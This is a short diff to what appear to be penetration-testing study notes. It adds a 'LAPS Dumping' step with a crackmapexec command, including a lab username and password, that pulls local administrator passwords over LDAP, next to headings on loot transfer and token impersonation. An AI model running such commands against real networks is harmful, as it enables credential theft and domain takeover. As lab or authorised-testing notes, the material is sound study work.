@@ -113,7 +113,8 @@ Transfer loot back to kali:
 
 ## GPP credentials 
 
-
+## LAPS Dumping 
+1. `crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps`
 ## Token Impersonation
 0. If we navigate to a machine and token of a domain administrator(user), we have domain admin. 
 
